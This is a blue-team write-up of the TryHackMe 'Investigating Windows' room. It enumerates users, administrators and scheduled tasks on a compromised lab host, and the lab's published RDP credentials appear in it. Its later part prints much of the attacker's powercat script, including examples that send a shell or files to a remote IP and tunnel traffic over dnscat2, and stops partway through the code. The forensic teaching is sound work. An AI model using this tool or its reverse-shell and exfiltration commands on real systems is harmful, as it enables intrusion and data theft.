---
link: https://tryhackme.com/room/investigatingwindows
difficulty: Easy
description: A windows machine has been hacked, its your job to go investigate this windows machine and find clues to what the hacker might have done.
tags:
image: https://cdn-images.tryhackme.com/room-icons/ca912860a1629510138df1b796ae687f.png
solved:
solve date:
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Investigating Windows Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/ca912860a1629510138df1b796ae687f.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): tryhackme, Aashir.Masood</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 26 Aug 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

Category: **Blue Team / Digital Forensics & Incident Response**, with a secondary flavour of **Windows internals enumeration**. DFIR comes first because the machine is already compromised — nothing here is exploited, everything is _read_: event logs, registry Run keys, scheduled tasks, the hosts file, firewall rules. The Windows-internals half matters because every answer lives in a native artifact, so you can't find anything without knowing where Windows stores logon records, persistence entries, and name-resolution overrides.

The concrete mechanism: an attacker landed on a Server 2016 host, dropped tooling into a temp directory, wired it into Task Scheduler for persistence, added privileged accounts, punched a firewall hole, and poisoned name resolution — and left a full artifact trail behind. Your job is to reconstruct that trail in order and build a timeline from it.

Access is over RDP as `Administrator` / `letmein123!`. The box does not answer ICMP and takes a few minutes to boot, so don't panic if it looks dead at first.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1
### Q1 What's the version and year of the windows machine?

==Windows Server 2016==
<div align="center">
<br>
<br>
</div>

Your **attacking/client machine** is just whatever you use to open the RDP session. You have two choices there:

- **Your own Kali host over the THM OpenVPN connection.** Download your `.ovpn` config from the THM access page, run `sudo openvpn user.ovpn`, wait for the "Initialization Sequence Completed" line, confirm you're connected on the THM access page, then RDP in with `xfreerdp`. This is the option I'm using.
- **The THM AttackBox** (browser-based, no VPN needed). Start it from the room page and RDP out from inside it. Slower and clunkier, but zero setup.

Start the VPN and confirm it's actually up before touching RDP. Run these in a terminal you can leave open (OpenVPN holds the terminal):

```
sudo openvpn ~/Downloads/<your-thm-username>.ovpn
```

Watch for `Initialization Sequence Completed` in the output.

Start the machine on the room page, wait for the target IP to appear, and connect:

```
xfreerdp /v:TARGET_IP /u:Administrator /p:'letmein123!' /dynamic-resolution +clipboard /cert:ignore
```

**Breakdown:**

| Component             | Purpose                                               | Simple Explanation                                      |
| --------------------- | ----------------------------------------------------- | ------------------------------------------------------- |
| `xfreerdp`            | Linux RDP client (may be `xfreerdp3` on current Kali) | The program that opens a remote Windows desktop         |
| `/v:TARGET_IP`        | Target host, port 3389 implied                        | Which machine to connect to                             |
| `/u:Administrator`    | Logon username                                        | Who you log in as                                       |
| `/p:'letmein123!'`    | Password, single-quoted                               | Quotes stop the shell mangling the `!` character        |
| `/dynamic-resolution` | Resizes remote desktop with the window                | Lets you make the window bigger without losing the view |
| `+clipboard`          | Bidirectional clipboard redirection                   | Copy and paste between your machine and the target      |
| `/cert:ignore`        | Accepts self-signed RDP certificate                   | Skips the "this certificate isn't trusted" prompt       |

Now to question 1 of the room: **What's the version and year of the Windows machine?**

The GUI route is `Win+R` → `winver`, which pops a small dialog with the product name and build.

![[Pasted image 20260826123637.png|667]]

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q2 Which user logged in last?

==Administrator==
<div align="center">
<br>
<br>
</div>

**Command:**

```
net user
net user Jenny
net user John
net user Administrator
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`net user`|Lists all local account names|Shows who has an account on this machine|
|`net user <name>`|Dumps that account's SAM attributes|Shows the details for one specific account|
|`Last logon` field|Most recent successful logon timestamp|When that person last got in|
|`Password last set` field|When the password was last changed|Useful for spotting accounts created or altered by an attacker|
|`Local Group Memberships` field|Local groups the account belongs to|Reveals whether the account holds admin rights|

**Result:**

```powershell
PS C:\Users\Administrator> net user

User accounts for \\EC2AMAZ-I8UHO76

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Jenny                    John                     ssm-user
The command completed successfully.

PS C:\Users\Administrator> net user Jenny
User name                    Jenny
Full Name                    Jenny
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/2/2019 4:52:25 PM
Password expires             Never
Password changeable          3/2/2019 4:52:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.

PS C:\Users\Administrator> net user John
User name                    John
Full Name                    John
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/2/2019 5:48:19 PM
Password expires             Never
Password changeable          3/2/2019 5:48:19 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/2/2019 5:48:32 PM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

PS C:\Users\Administrator> net user Administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/26/2026 9:21:21 AM
Password expires             Never
Password changeable          8/26/2026 9:21:21 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/26/2026 9:29:35 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.

PS C:\Users\Administrator>
```

**Key findings:**

- **The most recent logon on the host is `Administrator` at 8/26/2026 9:29:35 AM**. This is the investigator's own RDP session established in step 1.1, not attacker activity.
- Six local accounts exist: `Administrator`, `DefaultAccount`, `Guest`, `Jenny`, `John`, `ssm-user`. `DefaultAccount` and `ssm-user` are platform accounts (the latter is AWS Systems Manager, expected on an EC2 instance).
- `John` last logged on **3/2/2019 5:48:32 PM**, thirteen seconds after his password was set.
- `Jenny` has **never logged on**, yet holds membership in the local **Administrators** group.
- Both `Jenny` and `John` had passwords set on **3/2/2019**, roughly an hour apart.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q3 When did John log onto the system last?

==03/02/2019 5:48:32 PM==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q4 What IP does the system connect to when it first starts?

==10.34.2.3==

![[Pasted image 20260826132622.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q5 What two accounts had administrative privileges (other than the Administrator user)?

==Guest, Jenny==
<div align="center">
<br>
<br>
</div>

**Command:**

```
net localgroup administrators
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`net localgroup`|Lists local security groups|Shows the groups defined on this machine|
|`administrators`|Names a specific group to enumerate|Prints who is inside that group instead of listing all groups|

**Result:**

```powershell
PS C:\Users\Administrator> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Guest
Jenny
ssm-user
The command completed successfully.

PS C:\Users\Administrator>
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q6 What's the name of the scheduled task that is malicious.

==Clean file system==
<div align="center">
<br>
<br>
</div>

**GUI:**

```
Win+R  →  taskschd.msc  →  Task Scheduler Library
```

**Result:**

![[Pasted image 20260826141828.png]]

**Result:**

| Name                    | Status          | Triggers                                                   | Author                       | Analysis                                                             | Simple Explanation                                     |
| ----------------------- | --------------- | ---------------------------------------------------------- | ---------------------------- | -------------------------------------------------------------------- | ------------------------------------------------------ |
| Amazon Ec2 Launch – In… | Disabled        | At system startup                                          | —                            | AWS provisioning                                                     | Cloud platform setup, expected                         |
| Amazon Ec2 Launch – U…  | Ready           | At system startup                                          | —                            | AWS provisioning                                                     | Cloud platform setup, expected                         |
| BADR                    | Ready           | At system startup                                          | `WORKGROUP\EC2AMAZ-I8UHO76$` | Lab monitoring agent, SYSTEM + highest privileges                    | The training platform watching the box                 |
| BadrClient              | Ready           | At system startup                                          | —                            | Lab monitoring agent                                                 | Same, client half                                      |
| check logged in         | Ready           | At 4:59 PM every day                                       | `EC2AMAZ-I8UHO…`             | Suspicious — requires action inspection                              | Runs daily, purpose unknown                            |
| Clean file system       | Ready → Running | At 4:55 PM every day                                       | `EC2AMAZ-I8UHO…`             | **Malicious** — see 2.4                                              | Innocent name, hostile payload                         |
| falshupdate22           | Ready           | At 4:49 PM on 3/2/2019, repeat every 00:02:00 indefinitely | `Administrator`              | Suspicious — misspelled name, trigger date matches compromise window | "flashupdate" typo, first fired on the compromise date |
| npcapwatchdog           | Ready           | At system startup                                          | —                            | Npcap packet driver service                                          | Legitimate capture driver                              |
| update windows          | Ready           | At system startup                                          | `EC2AMAZ-I8UHO…`             | Suspicious — requires action inspection                              | Sounds official, needs checking                        |
Both `check logged in` and `Clean file system` report `Last Run Result: The operator or administrator has refused the request (0x800710E0)` the task attempted to run and was blocked, typically because "Run only when user is logged on" was set with no session present. Failure to run does not indicate the task is benign.

**What this gives you:** Separate platform noise from candidates. The two `Amazon Ec2 Launch` entries and `npcapwatchdog` are infrastructure. `BADR` and `BadrClient` are TryHackMe's own agents. The machine-account author and SYSTEM context look alarming in isolation but postdate the 2019 incident entirely. Four tasks warrant inspection: `check logged in`, `Clean file system`, `falshupdate22`, and `update windows`.

**Next:** Names alone prove nothing. Open the Actions tab of each candidate to read what is actually executed.

`Clean file system` carries an administrative-sounding name and a daily trigger, matching the profile of attacker persistence disguised as maintenance. Read its configured action.

**GUI:**

```
Task Scheduler → select "Clean file system" → Actions tab
```

**Result:**

```
Action           Details
Start a program  C:\TMP\nc.ps1 -l 1348
```

Trigger: `At 4:55 PM every day`

Running the task opens notepad which reveals the script's identity in its first line and embedded help text:

```
function powercat
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Execute")][string]$e="",
    [alias("ExecutePowershell")][switch]$ep=$False,
    [alias("Relay")][string]$r="",
    [alias("UDP")][switch]$u=$False,
    [alias("dnscat2")][string]$dns="",
    [alias("DNSFailureThreshold")][int32]$dnsft=10,
    [alias("Timeout")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("OutputFile")][string]$of="",
    [alias("Disconnect")][switch]$d=$False,
    [alias("Repeater")][switch]$rep=$False,
    [alias("GeneratePayload")][switch]$g=$False,
    [alias("GenerateEncoded")][switch]$ge=$False,
    [alias("Help")][switch]$h=$False
  )
  
  ############### HELP ###############
  $Help = "
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: powercat [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.
            
  -l              Listen Mode. Start a listener on the port specified by -p.
  
  -p  <port>      Port. The port to connect to, or the port to listen on.
  
  -e  <proc>      Execute. Specify the name of the process to start.
  
  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
            
  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
            
  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.
            
  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the 
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2
            
  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.
            
  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60
            
  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
            
  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
  -of <path>      Output File.  Specify the path to a file to write output to.
            
  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.
            
  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.
                  
  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.
                  
  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.

Examples:

  Listen on port 8000 and print the output to the console.
      powercat -l -p 8000
  
  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
      powercat -c 10.1.1.1 -p 443 -e cmd -v
  
  Connect to the dnscat2 server on c2.example.com, and send dns queries
  to the dns server on 10.1.1.1 port 53.
      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
  
  Send a file to 10.1.1.15 port 8000.
      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
  
  Write the data sent to the local listener on port 4444 to C:\outfile
      powercat -l -p 4444 -of C:\outfile
  
  Listen on port 8000 and repeatedly server a powershell shell.
      powercat -l -p 8000 -ep -rep
  
  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
      powercat -l -p 8000 -r tcp:10.1.1.1:9000
      
  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
  sending queries to 10.1.1.1 port 53.
      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
"
  if($h){return $Help}
  ############### HELP ###############
  
  ############### VALIDATE ARGS ###############
  $global:Verbose = $Verbose
  if($of -ne ''){$o = 'Bytes'}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
    if($p -eq ""){return "Please provide a port number to -p."}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      $Failure = $False
      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
      if($Failure){break}
    }
  }
  ############### VALIDATE ARGS ###############
  
  ############### UDP FUNCTIONS ###############
  function Setup_UDP
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $c,$l,$p,$t = $FuncSetupVars
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    if($l)
    {
      $SocketDestinationBuffer = New-Object System.Byte[] 65536
      $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
      $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
      $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
          {
            Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
            $FuncVars["Socket"].Close()
            $Stopwatch.Stop()
            break
          }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
        {
          $FuncVars["Socket"].Close()
          $Stopwatch.Stop()
          Write-Verbose "Timeout!" ; break
        }
        if($ConnectHandle.IsCompleted)
        {
          $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
          Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
          if($SocketBytesRead -gt 0){break}
          else{break}
        }
      }
      $Stopwatch.Stop()
      $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
    }
    else
    {
      if(!$c.Contains("."))
      {
        $IPList = @()
        [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
      }
      else
      {
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
      $FuncVars["Socket"].Connect($c,$p)
      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
      Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
    }
    $FuncVars["BufferSize"] = 65536
    $FuncVars["EndPoint"] = $EndPoint
    $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
    $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    return $FuncVars
  }
  function ReadData_UDP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    }
    return $Data,$FuncVars
  }
  function WriteData_UDP
  {
    param($Data,$FuncVars)
    $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
    return $FuncVars
  }
  function Close_UDP
  {
    param($FuncVars)
    $FuncVars["Socket"].Close()
  }
  ############### UDP FUNCTIONS ###############
  
  ############### DNS FUNCTIONS ###############
  function Setup_DNS
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    function ConvertTo-HexArray
    {
      param($String)
      $Hex = @()
      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
      return $Hex
    }
    
    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
      $result = ($Command | nslookup 2>&1 | Out-String)
      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
      else{return 1}
    }
    
    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
    }
    
    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }
    
    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }
    
    function DecodePacket
    {
      param($Packet)
      
      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()
      
      if($Packet.Length -gt 18)
      {
        $PacketElim = $Packet.Substring(18)
        while($PacketElim.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
          $PacketElim = $PacketElim.Substring(2)
        }
      }
      
      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }
    
    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
      return $Hex
    }
    $FuncVars = @{}
    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
    if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
    $FuncVars["Tag"] = ""
    $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
    
    $FuncVars["Create_SYN"] = ${function:Create_SYN}
    $FuncVars["Create_MSG"] = ${function:Create_MSG}
    $FuncVars["Create_FIN"] = ${function:Create_FIN}
    $FuncVars["DecodePacket"] = ${function:DecodePacket}
    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
    $FuncVars["AckData"] = ${function:AcknowledgeData}
    $FuncVars["SendPacket"] = ${function:SendPacket}
    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Failures"] = 0
    
    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
    $ReturningData = $DecodedPacket[1]
    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
    $FuncVars["AckNum"] = $DecodedPacket[2]
    $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
    return $FuncVars
  }
  function ReadData_DNS
  {
    param($FuncVars)
    if($global:Verbose){$Verbose = $True}
    
    $PacketsData = @()
    $PacketData = ""
    
    if($FuncVars["InputData"] -ne $null)
    {
      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
      $SectionCount = 0
      $PacketCount = 0
      foreach($Char in $Hex)
      {
        if($SectionCount -ge 30)
        {
          $SectionCount = 0
          $PacketData += "."
        }
        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
        {
          $PacketsData += $PacketData.TrimEnd(".")
          $PacketCount = 0
          $SectionCount = 0
          $PacketData = ""
        }
        $PacketData += $Char
        $SectionCount += 2
        $PacketCount += 2
      }
      $PacketData = $PacketData.TrimEnd(".")
      $PacketsData += $PacketData
      $FuncVars["InputData"] = ""
    }
    else
    {
      $PacketsData = @("")
    }
    
    [byte[]]$ReturningData = @()
    foreach($PacketData in $PacketsData)
    {
      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
      catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
      try
      {
        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
        if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
        $FuncVars["AckNum"] = $DecodedPacket[2]
        $FuncVars["SeqNum"] = $DecodedPacket[3]
        $ReturningData += $DecodedPacket[1]
      }
      catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
      if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
    }
    
    if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
    
    if($ReturningData -ne @())
    {
      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
    }
    return $ReturningData,$FuncVars
  }
  function WriteData_DNS
  {
    param($Data,$FuncVars)
    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
    return $FuncVars
  }
  function Close_DNS
  {
    param($FuncVars)
    $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
  }
  ############### DNS FUNCTIONS ###############
  
  ########## TCP FUNCTIONS ##########
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = New-Object System.Net.Sockets.TcpClient
      Write-Verbose "Connecting..."
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
      $Socket = New-Object System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }
    
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
        {
          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        Write-Verbose "Timeout!" ; break
        break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            $BufferSize = $Socket.ReceiveBufferSize
            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          $BufferSize = $Client.ReceiveBufferSize
          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars["Stream"] = $Stream
    $FuncVars["Socket"] = $Socket
    $FuncVars["BufferSize"] = $BufferSize
    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
